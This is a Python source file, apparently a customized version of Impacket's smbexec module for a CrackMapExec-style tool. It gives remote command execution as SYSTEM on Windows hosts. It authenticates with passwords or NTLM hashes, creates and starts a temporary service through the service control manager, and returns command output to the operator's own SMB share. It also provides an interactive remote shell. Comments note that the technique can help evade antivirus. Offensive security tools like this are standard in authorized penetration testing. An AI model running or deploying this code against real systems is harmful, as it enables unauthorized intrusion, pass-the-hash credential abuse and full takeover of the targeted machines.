#!/usr/bin/env python
#
#       Executes as SYSTEM
#
#
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to psexec w/o using RemComSvc. The technique is described here
# https://www.optiv.com/blog/owning-computers-without-shell-access
# Our implementation goes one step further, instantiating a local smbserver to receive the
# output of the commands. This is useful in the situation where the target machine does NOT
# have a writeable share available.
# Keep in mind that, although this technique might help avoiding AVs, there are a lot of
# event logs generated and you can't expect executing tasks that will last long since Windows
# will kill the process since it's not responding as a Windows service.
# Certainly not a stealthy way.
#
# This script works in two ways:
# 1) share mode: you specify a share, and everything is done through that share.
# 2) server mode: if for any reason there's no share available, this script will launch a local
#    SMB server, so the output of the commands executed are sent back by the target machine
#    into a locally shared folder. Keep in mind you would need root access to bind to port 445
#    in the local machine.
#
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCE/RPC and SMB.


# Customized by @awsmhacks for CMX



import logging
import os
import cmd
import sys
from gevent import sleep

import impacket
from impacket.dcerpc.v5 import transport, scmr
from impacket.smbconnection import *

from cmx.helpers.misc import gen_random_string
from cmx.servers.smb import CMXSMBServer
from cmx import config as cfg

OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = './logs/'
DUMMY_SHARE     = 'TMP'


class SMBEXEC:

    def __init__(self, host, share_name, protocol, username = '', password = '',
                 domain = '', hashes = None, share = None, port=445):

        self.__host = host
        self.__share_name = share_name
        self.__port = port
        self.__username = username
        self.__password = password
        self.__serviceName = gen_random_string()
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__conn = None
        self.__mode  = 'SHARE'
        #self.__aesKey = aesKey
        #self.__doKerberos = doKerberos

        if hashes is not None:
        #This checks to see if we didn't provide the LM Hash
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        #since we might have not passed in a pass and used a hash instead
        if self.__password is None:
            self.__password = ''


    def execute(self, command, output=False):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.__host
        logging.debug('StringBinding %s'%stringbinding)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, 'setRemoteHost'):
            self.__rpctransport.setRemoteHost(self.__host)

        #if hasattr(self.__rpctransport,'preferred_dialect'):
        #    self.__rpctransport.preferred_dialect(impacket.smb.SMB_DIALECT)

        if hasattr(self.__rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain,
                                                self.__lmhash, self.__nthash)
        #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        self.__scmr.connect()

        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)

        self.__scHandle = resp['lpScHandle']

        self.__retOutput = output
        self.execute_fileless(command)
        self.finish()
        return self.__outputBuffer


    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + '.bat'
        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        if self.__retOutput:
            #adding creds gets past systems disallowing guest-auth
            command = self.__shell + '"net use /p:no \\\\{}\\{} /user:{} {}" \n'.format(local_ip, self.__share_name, self.__username, self.__password) 
            command += self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
        else:
            command = self.__shell + data

        with open((cfg.TMP_PATH / self.__batchFile), 'w') as batch_file:
            batch_file.write(command)

        logging.debug('Hosting batch file({}) containing:\n{}'.format(str(cfg.TMP_PATH / self.__batchFile), command))

        batchLauncher = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)

        command = self.__shell + '"net use * /d /y & '
        #adding creds gets past systems disallowing guest-auth
        command += self.__shell + 'net use \\\\{}\\{} /p:no /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, batchLauncher)
        
        logging.debug('Command to execute: ' + command)

        logging.debug('Remote service {} created.'.format(self.__serviceName))
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            logging.debug('Remote service {} started.'.format(self.__serviceName))
            scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()


    def get_output_fileless(self):
        if not self.__retOutput: return

        while True:
            try:
                with open((cfg.TMP_PATH / self.__output), 'r') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpctransport.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass


#Getting shellular
    def run(self, remoteName, remoteHost):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('inside run of smbexec StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport,'preferred_dialect'):
            rpctransport.setRemoteHost(self.__host)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)  # not handling kerberoas yet ;)

        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = CMXSMBServer(logging, self.__share)
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
            self.shell.cmdloop()
            if self.__mode == 'SERVER':
                serverThread.stop()
        except  (Exception, KeyboardInterrupt) as e:
            import traceback
            traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            sys.exit(1)


#

#
class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        logging.debug('Inside RemoteShell init, before cmd.Cmd.init')
        cmd.Cmd.__init__(self)
        logging.debug('Inside RemoteShell init, after cmd.Cmd.init')        
        self.__share = share
        self.__mode = mode
        #OUTPUT_FILENAME = gen_random_string()
        #BATCH_FILENAME = gen_random_string()
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = "   .... i'm in \n"


        self.__scmr = rpc.get_dce_rpc()
        logging.debug('after rpc.get_dce_rpc()')
        try:
            self.__scmr.connect()
            logging.debug('after self.__scmr.connect()')
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()
        logging.debug('after getSMBconnection ')

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            logging.debug('Myip: {} '.format(myIPaddr))
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect() 
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
            self.__outputBuffer = b''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile 

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer.decode())
        self.__outputBuffer = b''